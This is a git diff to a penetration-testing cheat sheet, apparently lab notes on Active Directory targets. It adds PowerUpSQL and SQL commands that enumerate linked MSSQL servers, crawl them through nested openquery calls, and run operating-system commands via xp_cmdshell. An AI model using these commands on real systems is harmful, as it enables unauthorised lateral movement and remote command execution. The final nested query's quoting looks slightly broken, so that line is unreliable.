@@ -366,7 +366,7 @@ Or you could skip step 3-4 using Rubeus
 ```
 
 ## MSSQL
-1. Enumurate MSSQL
+### 1. Enumurate MSSQL
 ```powershell
 Import-Module .\PowerupSQL.psd1
 #Discovery (SPN Scanning)
@@ -379,8 +379,32 @@ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
 #Gather Information
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 ```
+### 2. Enumurate Database link
+PowerupSQL.psd1:
+```powershell
+Import-Module .\PowerupSQL.psd1
+Get-SQLServerLink -Instance dcorp-mssql -Verbose
+Get-SQLInstanceDomain | Get-SQLServerLink
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
+```
+MSSQL:
+```sql
+select * from master..sysservers
 
+# execute SQL query on another link
+select * from openquery("dcorp-sql1",'select * from master..sysservers')
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')
+```
+### 3. EXEcute Command
 
+PowerupSQL.psd1:
+```powershell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" 
+```
+MSSQL:
+```sql
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select@@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
+```
 
 # Jenkin --> move to CVE catagory
 1. jenkin default allow us to read user and computer
